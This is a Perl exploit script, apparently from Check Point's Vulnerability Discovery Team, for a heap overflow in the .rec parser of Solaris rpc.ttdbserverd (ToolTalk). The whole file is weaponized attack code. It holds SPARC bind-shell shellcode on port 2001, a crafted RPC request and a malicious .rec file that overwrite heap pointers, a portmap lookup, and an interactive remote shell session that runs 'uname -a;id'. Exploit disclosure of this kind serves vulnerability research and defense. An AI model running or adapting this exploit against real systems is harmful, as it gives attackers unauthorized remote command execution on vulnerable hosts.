##########################################################################
# Check Point Software Technologies - Vulnerability Discovery Team (VDT) #
# Rodrigo Rubira Branco - <rbranco *noSPAM* checkpoint.com>		 #
#									 #
# RPC TTDB .rec parser Heap Overflow					 #
#									 #	
# thr_jmp_table does not exist on Solaris 10 u8 so use the -a		 #
# option to specify the address of the saved window or other structures	 #
# to overwrite								 #
##########################################################################

use POSIX;
use IO::Socket;
use IO::Select;
use Getopt::Std;

$shellrise =
 "\xa0\x23\xa0\x10".#   /* sub          %sp, 16, %l0 */
  "\xae\x23\x80\x10".#  /* sub          %sp, %l0, %l7 */
  "\xee\x23\xbf\xec".#  /* st           %l7, [%sp - 20] */
  "\x82\x05\xe0\xd6".#  /* add          %l7, 214, %g1 */
  "\x90\x25\xe0\x0e".#  /* sub          %l7, 14, %o0 */
  "\x92\x25\xe0\x0e".#  /* sub          %l7, 14, %o1 */
  "\x94\x1c\x40\x11".#  /* xor          %l1, %l1, %o2 */
  "\x96\x1c\x40\x11".#  /* xor          %l1, %l1, %o3 */
  "\x98\x25\xe0\x0f".#  /* sub          %l7, 15, %o4 */
  "\x91\xd0\x38\x08".#  /* ta           0x8 */
  "\xa4\x1a\x80\x08".#  /* xor          %o2, %o0, %l2 */
  "\xd2\x33\xbf\xf0".#  /* sth          %o1, [%sp - 16] */
  "\xac\x10\x27\xd1".#  /* mov          2001, %l6 */
  "\xec\x33\xbf\xf2".#  /* sth          %l6, [%sp - 14] */
  "\xc0\x23\xbf\xf4".#  /* st           %g0, [%sp - 12] */
  "\x82\x05\xe0\xd8".#  /* add          %l7, 216, %g1 */
  "\x90\x1a\xc0\x12".#  /* xor          %o3, %l2, %o0 */
  "\x92\x1a\xc0\x10".#  /* xor          %o3, %l0, %o1 */
  "\x94\x1a\xc0\x17".#  /* xor          %o3, %l7, %o2 */
  "\x91\xd0\x38\x08".#  /* ta           0x8 */
  "\x82\x05\xe0\xd9".#  /* add          %l7, 217, %g1 */
  "\x90\x1a\xc0\x12".#  /* xor          %o3, %l2, %o0 */
  "\x92\x25\xe0\x0b".#  /* sub          %l7, 11, %o1 */
  "\x91\xd0\x38\x08".#  /* ta           0x8 */
  "\x82\x05\xe0\xda".#  /* add          %l7, 218, %g1 */
  "\x90\x1a\xc0\x12".#  /* xor          %o3, %l2, %o0 */
  "\x92\x1a\xc0\x10".#  /* xor          %o3, %l0, %o1 */
  "\x94\x23\xa0\x14".#  /* sub          %sp, 20, %o2 */
  "\x91\xd0\x38\x08".#  /* ta           0x8 */
  "\xa6\x1a\xc0\x08".#  /* xor          %o3, %o0, %l3 */
  "\x82\x05\xe0\x2e".#  /* add          %l7, 46, %g1 */
  "\x90\x1a\xc0\x13".#  /* xor          %o3, %l3, %o0 */
  "\x92\x25\xe0\x07".#  /* sub          %l7, 7, %o1 */
  "\x94\x1b\x80\x0e".#  /* xor          %sp, %sp, %o2 */
  "\x91\xd0\x38\x08".#  /* ta           0x8 */
  "\x90\x1a\xc0\x13".#  /* xor          %o3, %l3, %o0 */
  "\x92\x25\xe0\x07".#  /* sub          %l7, 7, %o1 */
  "\x94\x02\xe0\x01".#  /* add          %o3, 1, %o2 */
  "\x91\xd0\x38\x08".#  /* ta           0x8 */
  "\x90\x1a\xc0\x13".#  /* xor          %o3, %l3, %o0 */
  "\x92\x25\xe0\x07".#  /* sub          %l7, 7, %o1 */
  "\x94\x02\xe0\x02".#  /* add          %o3, 2, %o2 */
  "\x91\xd0\x38\x08".#  /* ta           0x8 */
  "\x90\x1b\x80\x0e".#  /* xor          %sp, %sp, %o0 */
  "\x82\x02\xe0\x17".#  /* add          %o3, 23, %g1 */
  "\x91\xd0\x38\x08".#  /* ta           0x8 */
  "\x21\x0b\xd8\x9a".#  /* sethi        %hi(0x2f626800), %l0 */
  "\xa0\x14\x21\x6e".#  /* or           %l0, 0x16e, %l0 ! 0x2f62696e */
  "\x23\x0b\xdc\xda".#  /* sethi        %hi(0x2f736800), %l1 */
  "\x90\x23\xa0\x10".#  /* sub          %sp, 16, %o0 */
  "\x92\x23\xa0\x08".#  /* sub          %sp, 8, %o1 */
  "\x94\x1b\x80\x0e".#  /* xor          %sp, %sp, %o2 */
  "\xe0\x3b\xbf\xf0".#  /* std          %l0, [%sp - 16] */
  "\xd0\x23\xbf\xf8".#  /* st           %o0, [%sp - 8] */
  "\xc0\x23\xbf\xfc".#  /* st           %g0, [%sp - 4] */
  "\x82\x02\xe0\x3b".#  /* add          %o3, 59, %g1 */
  "\x91\xd0\x38\x08".#  /* ta           0x8 */
  "\x90\x1b\x80\x0e".#  /* xor          %sp, %sp, %o0 */
  "\x82\x02\xe0\x01".#  /* add          %o3, 1, %g1 */
  "\x91\xd0\x38\x08";#  /* ta           0x8 */

getopts('h:o:f:a:',\%args);

if(defined($args{'h'})){ $host = $args{'h'}; }else{ $host = "localhost"; }
if(defined($args{'o'})){ $offset = $args{'o'}; }else{ $offset = 0; }
if(defined($args{'f'})){ $file = $args{'f'}; }else{ $file = "/tmp/owned"; }
if(defined($args{'a'})){ $addr = hex($args{'a'}); }else{ $addr = 0; }

print STDERR "-= rpc.ttdbserverd .rec parser exploit for Solaris 9/10 SPARC =-\n";
print STDERR "-= Check Point Software Technologies - Vulnerability Discovery Team (VDT) =-\n";
print STDERR "-= Rodrigo Rubira Branco <rbranco *noSPAM* checkpoint.com> =-\n\n";
print STDERR "   Usage: [-f] /file/name [-h] hostname [-o] offset [-a] addr\n";

$remote = 1;

if($host =~ /localhost/){

  $remote = 0;

  if(!$addr){
  	$addr = get_thr_addr();
  }
}

$heap = $addr - 8; # Where to write
$pheap = pack('l',$heap);
$stck = 0x00087080 + $offset; # Shellcode Address
$pstck = pack('l',$stck);
$null = $heap + 0x300; # Poiting to null
$pnull = pack('l',$null);


$rpcdata = # rpc.ttdbserverd is_erase procedure call
"\x80\x00\x00\x98\x19\x38\xba\x51\x00\x00\x00\x00\x00\x00".
"\x00\x02\x00\x01\x86\xf3\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00".
"\x00\x01\x00\x00\x00\x20\x4b\x3b\x63\x40\x00\x00\x00\x09\x6c\x6f".
"\x63\x61\x6c\x68\x6f\x73\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
pack('N',length($file)) .
$file.
"\x00\x00\x00\x00\x00". 
"\x20\x00" . "a" x ( 5 - (length($file) % 4)). 
"\x10\x80\x00\x03" x (( 7596 - length($shellrise))/4).
"\x80\x1c\x40\x11" x 2 . $shellrise . "\x00" x 593 .
"\x00\x00\x00\x00\x00\x04\x35\x36\x37\x38".
"\x00\x00\x00\x00\x00\x04\x39\x40\x41\x42\x00\x00\x00\x00\x00\x04".
"\x43\x44\x45\x46\x00\x00\x00\x00\x00\x04\x47\x48\x49\x50\x00\x00".
"\x00\x00\x00\x04\x51\x52\x53\x54\x00\x00\x00\x04\x55\x56\x57\x58";

$rec =
"\x4E\x65\x74\x49\x53\x41\x4D\x00\x55\x6E\x6B\x6E\x6F\x77\x6E\x00".
"\x31\x2E\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x04\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x03\x00\x1C\x00\x1C\x00\x00\x00\x00\x00\x03\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x04".
"\xFF\xFF\xFF\xFF\x00\x01".
"\x78" x 122 .
"\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x0f".
"\x00\x00".
"\x00\x00\x00\x00".
"\xff\xff\xff\xf0" x 21 .
"\x00\x00\x00\x00".
"\xff\xff\xff\xff".
$pstck.
"\x00\x00\x00\x00".
"\xff\xff\xff\xff".
"\xff\xff\xff\xff".
$pnull.
"\xff\x00\x00\x00".
$pheap.
"\x44" x 3000; 

if(!$remote){
	$file = $file . ".rec";
	open(F,">$file") or die("Cant create $file!");
	print STDERR "[+] Creating file " . $file . "\n";
	print F $rec;
	close(F);
	print STDERR "[+] Writing 0x" . sprintf('%lx',$stck) . " to 0x" . sprintf('%lx', $heap + 8) . "\n";
}

$port = rpc_getport($host, 111, 100083, 1);
if(!$port){ die ("[-] TTDB not running on target!\n");}

print STDERR "[+] TTDB running on port $port\n";

$sock = IO::Socket::INET->new(Proto=>"tcp", PeerHost=>$host,PeerPort=>$port)
or die "[-] Cant Connect!!\n";
print STDERR "[+] Sending stuff to TTDB ...";
#<STDIN>;
print $sock $rpcdata;
print STDERR "d0ne!\n";

close($sock);

print STDERR "[+] Wait a little!\n";
sleep(2);

$sc = IO::Socket::INET->new(Proto=>"tcp", PeerHost=>$host,PeerPort=>2001,Type=>SOCK_STREAM,Reuse=>1)
  or die "[*] No luck :(\n\n";

print "[*] We got in =)\n";

$sc->autoflush(1);

sleep(2);

print $sc "echo;uname -a;id;echo\n";

die "cant fork: $!" unless defined($pid = fork());

if ($pid){
	while(defined ($line = <$sc>)){
        	print STDOUT $line;
	}
	kill("TERM", $pid);
}else{
        while(defined ($line = <STDIN>)) {
        	print $sc $line;
        }
}

close($sc);
print "Good bye!!\n";

sub rpc_getport {
    my ($target_host, $target_port, $prog, $vers) = @_;

    my $s = rpc_socket($target_host, $target_port);

    my $portmap_req =

        pack("L", rand() * 0xffffffff) . # XID
        "\x00\x00\x00\x00".              # Call
        "\x00\x00\x00\x02".              # RPC Version
        "\x00\x01\x86\xa0".              # Program Number  (PORTMAP)
        "\x00\x00\x00\x02".              # Program Version (2)
        "\x00\x00\x00\x03".              # Procedure (getport)
        ("\x00" x 16).                   # Credentials and Verifier
        pack("N", $prog) .
        pack("N", $vers).
        pack("N", 0x6).                  # Protocol: TCP 
        pack("N", 0x00);                 # Port: 0

    print $s $portmap_req;

    my $r = rpc_read($s);
    close ($s);

    if (length($r) == 28){
        my $prog_port = unpack("N",substr($r, 24, 4));
        return($prog_port);
    }

    return undef;
}

sub rpc_socket {
    my ($target_host, $target_port) = @_;
    my $s = IO::Socket::INET->new
    (
        PeerAddr => $target_host,
        PeerPort => $target_port,
        Proto    => "udp",
        Type     => SOCK_DGRAM
    );

    if (! $s){
        print "\nError: could not create socket to target: $!\n";
        exit(0);
    }

    select($s); $|++;
    select(STDOUT); $|++;
    nonblock($s);
    return($s);
}

sub rpc_read {
    my ($s) = @_;
    my $sel = IO::Select->new($s);
    my $res;
    my @fds = $sel->can_read(4);
    foreach (@fds) { $res .= <$s>; }
    return $res;
}

sub nonblock {
    my ($fd) = @_;
    my $flags = fcntl($fd, F_GETFL,0);
    fcntl($fd, F_SETFL, $flags|O_NONBLOCK);
}

sub hexdump
{
        my ($buf) = @_;
        my ($p, $c, $pc, $str);
        my ($i);

        for ($i=0;$i<length($buf);$i++){
                $p = substr($buf, $i, 1);
                $c = ord ($p);
                printf "%.2x ", $c;
                $pc++;
                if (($c > 31) && ($c < 127)){
                        $str .= $p;
                }else{
                        $str .= ".";
                }
                if ($pc == 16){
                        print " $str\n";
                        undef $str;
                        $pc = 0;
                }
        }
        print "   " x (16 - $pc);
        print " $str \n";
}

sub get_thr_addr {

	$cmd = `/usr/ccs/bin/dump -t /lib/ld.so.1 | grep thr_jmp_table`;
	($xx,$thr) = split(/ /,$cmd);

	if(!$thr){
		die("thr_jmp_table not found!\n");	   
	}

	$cmd2 = `/bin/pmap $$ | grep /lib/ld.so.1`;
	($base,$yy) = split(/ /,$cmd2);

	if(!$base){
		die("error geting base addr\n");
	}

	$base = hex($base);
	$thr = hex($thr);
	
	print STDERR "[+] Base at: 0x" . sprintf('%lx',$base) . "\n";
	print STDERR "[+] thr_jmp_table at: 0x" . sprintf('%lx',$thr) . "\n";
	
	return $base + $thr;

}